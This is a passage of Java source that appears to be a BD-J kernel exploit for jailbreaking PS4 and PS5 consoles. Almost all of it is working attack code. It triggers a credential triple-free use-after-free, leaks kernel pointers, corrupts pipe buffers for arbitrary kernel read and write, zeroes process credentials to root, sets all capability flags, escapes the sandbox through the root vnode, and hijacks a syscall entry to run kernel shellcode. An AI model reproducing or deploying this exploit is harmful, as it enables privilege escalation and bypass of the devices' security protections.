        while ((p & 0xFFFFFFFF00000000L) != 0xFFFFFFFF00000000L) {
            p = kapi.kread64(p + 0x08); // p_list.le_prev
        }

        close(pipeFd.get(1));
        close(pipeFd.get(0));
    
        return p;
    }

    private static long pfind(int pid) {
        long p = kapi.kread64(allproc);
        while (p != 0) {
            if (kapi.kread32(p + P_PID_OFFSET) == pid) {
                break;
            }
            p = kapi.kread64(p + 0x00); // p_list.le_next
        }

        return p;
    }

    private static void fhold(long fp) {
        kapi.kwrite32(fp + 0x28, kapi.kread32(fp + 0x28) + 1); // f_count
    }

    private static void removeRthrFromSocket(int fd) {
        long fp = fget(fd);
        if ((fp ^ 0x8000000000000000L) > 0x7FFF000000000000L) { 
            long f_data = kapi.kread64(fp + 0x00);
            long so_pcb = kapi.kread64(f_data + 0x18);
            long in6p_outputopts = kapi.kread64(so_pcb + IN6P_OUTPUTOPTS_OFFSET);
            kapi.kwrite64(in6p_outputopts + IP6PO_RHI_RTHDR_OFFSET, 0); // ip6po_rhi_rthdr
        } else {
            // Status.println("Skipped wrong fp: " + Long.toHexString(fp) + " for fd: " + String.valueOf(fd));
        }
    }

    private static void removeUafFile() {
        long uafFile = fget(uafSock);
        // Status.println("uafFile: " + Long.toHexString(uafFile));

        // Remove uaf sock.
        kapi.kwrite64(fdt_ofiles + uafSock * FILEDESCENT_SIZE, 0);

        // Remove triple freed file from uaf sock.
        int removed = 0;
        for (int i = 0; i < 0x1000; i++) {
            int s = socket(AF_UNIX, SOCK_STREAM, 0);
            if (fget(s) == uafFile) {
                kapi.kwrite64(fdt_ofiles + s * FILEDESCENT_SIZE, 0);
                removed++;
            }
            close(s);

            if (removed == 3) {
                // Status.println("Cleaned up uafFile after iterations: " + String.valueOf(i));
                break;
            }
        }
    }

    private static long getRootVnode() {
        long p = pfind(KERNEL_PID);
        long p_fd = kapi.kread64(p + 0x48);
        long rootvnode = kapi.kread64(p_fd + ROOTVNODE_OFFSET);
        return rootvnode;
    }

    private static long getPrison0() {
        long p = pfind(KERNEL_PID);
        long p_ucred = kapi.kread64(p + 0x40);
        long prison0 = kapi.kread64(p_ucred + 0x30);
        return prison0;
    }
    
    private static boolean ps4_jailbreak() {

        long kernel_base = kl_lock - PS4_KernelOffset.getOffset("KL_LOCK");
        
        // Status.println("Kernel base : " + Long.toHexString(kernel_base));

        long p = curproc;
        long p_ucred = kapi.kread64(p + 0x40);
        kapi.kwrite32(p_ucred + 0x04, 0); // cr_uid
        kapi.kwrite32(p_ucred + 0x08, 0); // cr_ruid
        kapi.kwrite32(p_ucred + 0x0C, 0); // cr_svuid
        kapi.kwrite32(p_ucred + 0x10, 1); // cr_ngroups
        kapi.kwrite32(p_ucred + 0x14, 0); // cr_rgid
        kapi.kwrite32(p_ucred + 0x18, 0); // cr_svgid

        kapi.kwrite64(p_ucred + 0x60, 0xFFFFFFFFFFFFFFFFL); // cr_sceCaps[0]
        kapi.kwrite64(p_ucred + 0x68, 0xFFFFFFFFFFFFFFFFL); // cr_sceCaps[1]

        // Allow root file system access.
        long rootvnode = getRootVnode();
        long p_fd = kapi.kread64(p + 0x48);
        kapi.kwrite64(p_fd + 0x10, rootvnode); // fd_rdir
        kapi.kwrite64(p_fd + 0x18, rootvnode); // fd_jdir
        
        return ps4_kpatch(kernel_base);
    }

    private static boolean ps4_kpatch(long kernel_base) {

        byte[] shellcode = PS4_KernelOffset.getShellcode();
        if (shellcode.length == 0) {
            return false;
        }

        long sysent661Addr = kernel_base + PS4_KernelOffset.getOffset("SYSENT_661_OFFSET");
        long mappingAddr = 0x920100000L;

        int syNarg = kapi.kread32(sysent661Addr);
        long syCall = kapi.kread64(sysent661Addr + 8);
        int syThrcnt = kapi.kread32(sysent661Addr + 0x2c);
        kapi.kwrite32(sysent661Addr, 2);
        kapi.kwrite64(sysent661Addr + 8, kernel_base + PS4_KernelOffset.getOffset("JMP_RSI_GADGET"));
        kapi.kwrite32(sysent661Addr + 0x2c, 1);

        int PROT_READ = 0x1;
        int PROT_WRITE = 0x2;
        int PROT_EXEC = 0x4;
        int PROT_RW = PROT_READ | PROT_WRITE;
        int PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC;

        int alignedMemsz = 0x10000;
        
        Int32 execHandle = new Int32();
        api.call(sceKernelJitCreateSharedMemory, 0L, (long) alignedMemsz, (long) PROT_RWX, execHandle.address());
        
        // map executable segment
        int mmap_ret = (int) api.call(mmap, mappingAddr, (long) alignedMemsz, (long) PROT_RWX, 0x11L, execHandle.get(), 0L);

        if (mmap_ret == -1) {
            Status.println("mmap failed");
            return false;
        }
        
        for (int i = 0; i < shellcode.length; i++) {
            api.write8(mappingAddr + i, shellcode[i]);
        }
        
        Status.println("Executing shellcode with kexec...");
        
        long kexec = __sys_dynlib_get_info2 + 0x20L;
        
        api.call(kexec, mappingAddr);
        kapi.kwrite32(sysent661Addr, syNarg);
        kapi.kwrite64(sysent661Addr + 8, syCall);
        kapi.kwrite32(sysent661Addr + 0x2c, syThrcnt);
        
        Status.println("Shellcode executed");
        
        return true;
    }

    private static boolean ps5_jailbreak() {

        kdata_base = allproc - PS5_KernelOffset.getOffset("ALLPROC");
        
        Status.println("kdata_base: " + Long.toHexString(kdata_base));
        
        long p = curproc;
        long p_ucred = kapi.kread64(p + 0x40);
        kapi.kwrite32(p_ucred + 0x04, 0); // cr_uid
        kapi.kwrite32(p_ucred + 0x08, 0); // cr_ruid
        kapi.kwrite32(p_ucred + 0x0C, 0); // cr_svuid
        kapi.kwrite32(p_ucred + 0x10, 1); // cr_ngroups
        kapi.kwrite32(p_ucred + 0x14, 0); // cr_rgid
        kapi.kwrite32(p_ucred + 0x18, 0); // cr_svgid
        
        kapi.kwrite64(p_ucred + 0x58, SYSCORE_AUTHID); // cr_sceAuthId
        kapi.kwrite64(p_ucred + 0x60, 0xFFFFFFFFFFFFFFFFL); // cr_sceCaps[0]
        kapi.kwrite64(p_ucred + 0x68, 0xFFFFFFFFFFFFFFFFL); // cr_sceCaps[1]
        kapi.kwrite8(p_ucred + 0x83, (byte) 0x80); // cr_sceAttr[0]
        
        // For some reason patching rootvnode makes BD-J crash when closing
        // Restore it before closing
        // Allow root file system access.
        
        long rootvnode = getRootVnode();        
        long p_fd = kapi.kread64(p + 0x48);
        bdj_vnode = kapi.kread64(p_fd + 0x10);
        
        Status.println("bdj_vnode: " + Long.toHexString(bdj_vnode));
        
        kapi.kwrite64(p_fd + 0x10, rootvnode); // fd_rdir
        
        if (!GPU.run(kdata_base, curproc)) {
            Status.println("GPU rw failed");
            return false;
        }
        
        return true;
    }
    
    private static void cleanup() {
        try {
            // Close all files.
            for (int i = 0; i < ipv6Socks.length; i++) {
                close(ipv6Socks[i]);
            }
    
            close(uioSs1);
            close(uioSs0);
            close(iovSs1);
            close(iovSs0);
    
            // Stop uio threads.
            for (int i = 0; i < UIO_THREAD_NUM; i++) {
                uioThreads[i].interrupt();
                uioThreads[i].join();
            }
    
            // Stop iov threads.
            for (int i = 0; i < IOV_THREAD_NUM; i++) {
                iovThreads[i].interrupt();
                iovThreads[i].join();
            }            
        } catch(Exception e) { }
    }

    private static String getNidPath() {
        Buffer pathBuffer = new Buffer(0x255);
        Int64 lenPtr = new Int64((long) 0x255);
    
        long ret = 0;
        try {
            ret = __sys_randomized_path(0, pathBuffer, lenPtr);
        } catch (Throwable e) {
            Status.error("__sys_randomized_path crash: " + e.getMessage());
            return "unknown";
        }
        if (ret == -1L) {
            Status.error("randomized_path failed: " + Long.toHexString(ret));
            return "unknown";
        }
    
        StringBuffer sb = new StringBuffer();
        for (int i = 0; i < 0x255; i++) {
            byte b = pathBuffer.getByte(i);
            if (b == 0) break;
            sb.append((char) b);
        }
        return sb.toString();
    }
    
    private static boolean rerunCheck(String path) {
        File file = new File(path);
    
        if (file.exists()) {
            return true;
        }

        try {
            if (file.createNewFile()) {
                return false;
            }
        } catch (IOException e) {
            Status.printStackTrace("Failed to create file: ", e);
        }
        
        return true;
    }

    
    public static void main(String[] args) {
        Status.setNetworkLoggerEnabled(false);
        
        Status.info(VERSION_STRING);
        
        if (kapi.getKdataBase() != 0) {
            Status.success("Already jailbroken");
            return;
        }
        
        if (!setup()) {
            Status.println("setup failed");
            return;
        }
        
        Status.info("Triggering exploit...");
        if (!triggerUcredTripleFree()) {
            Status.error("triggerUcredTripleFree failed");
            cleanup();
            Status.error("Exploit failed - Reboot and try again");
            return;
        }
        // Status.println("triggerUcredTripleFree finished");
        
        // Leak pointers from kqueue.
        if (!leakKqueue()) {
            Status.error("leakKqueue failed");
            cleanup();
            Status.error("Exploit failed - Reboot and try again");
            return;
        }
        // Status.println("leakKqueue finished");
        
        // Leak fd_files from kq_fdp.
        long fd_files = kreadSlow64(kq_fdp);
        fdt_ofiles = fd_files + FDT_OFILES_OFFSET;
        // Status.println("fdt_ofiles: " + Long.toHexString(fdt_ofiles));
        
        long masterRpipeFile = kreadSlow64(fdt_ofiles + kapi.getMasterPipeFd().get(0) * FILEDESCENT_SIZE);
        // Status.println("masterRpipeFile: " + Long.toHexString(masterRpipeFile));
        
        long victimRpipeFile = kreadSlow64(fdt_ofiles + kapi.getVictimPipeFd().get(0) * FILEDESCENT_SIZE);
        // Status.println("victimRpipeFile: " + Long.toHexString(victimRpipeFile));
        
        long masterRpipeData = kreadSlow64(masterRpipeFile + 0x00);
        // Status.println("masterRpipeData: " + Long.toHexString(masterRpipeData));
        
        long victimRpipeData = kreadSlow64(victimRpipeFile + 0x00);
        // Status.println("victimRpipeData: " + Long.toHexString(victimRpipeData));
        
        // Corrupt pipebuf of masterRpipeFd.
        Buffer masterPipebuf = new Buffer(PIPEBUF_SIZE);
        masterPipebuf.putInt(0x00, 0); // cnt
        masterPipebuf.putInt(0x04, 0); // in
        masterPipebuf.putInt(0x08, 0); // out
        masterPipebuf.putInt(0x0C, PAGE_SIZE); // size
        masterPipebuf.putLong(0x10, victimRpipeData); // buffer
        kwriteSlow(masterRpipeData, masterPipebuf);
        
        // Status.println("Arbitrary R/W achieved.");
        
        // Increase reference counts for the pipes.
        fhold(fget(kapi.getMasterPipeFd().get(0)));
        fhold(fget(kapi.getMasterPipeFd().get(1)));
        fhold(fget(kapi.getVictimPipeFd().get(0)));
        fhold(fget(kapi.getVictimPipeFd().get(1)));
        
        // Remove rthdr pointers from triplets.
        removeRthrFromSocket(ipv6Socks[triplets[0]]);
        removeRthrFromSocket(ipv6Socks[triplets[1]]);
        removeRthrFromSocket(ipv6Socks[triplets[2]]);
        
        // Remove triple freed file from free list.
        removeUafFile();
        
        // Find allproc.
        allproc = findAllProc();
        
        // Status.println("allproc: " + Long.toHexString(allproc));
        
        // Jailbreak.
        if (PLATFORM.equals("PS4")) {

            if (!ps4_jailbreak()) {
                Status.println("PS4 jailbreak failed");
                cleanup();
                Status.println("Exploit failed - Reboot and try again");
                NativeInvoke.sendNotificationRequest("Exploit failed - Reboot and try again");
                return;
            }
            
            cleanup();
            
            Status.success("Jailbreak complete");
            
        } else if (PLATFORM.equals("PS5")) {

            if (!ps5_jailbreak()) {
                Status.error("PS5 jailbreak failed");
                cleanup();
                Status.error("Exploit failed - Reboot and try again");
                return;
            }
            
            cleanup();
            
            kapi.setKdataBase(kdata_base);
            kapi.setKqFdp(kq_fdp);
            
            Status.success("Jailbreak complete");
            
        } else {
            cleanup();
        }
        
    }
}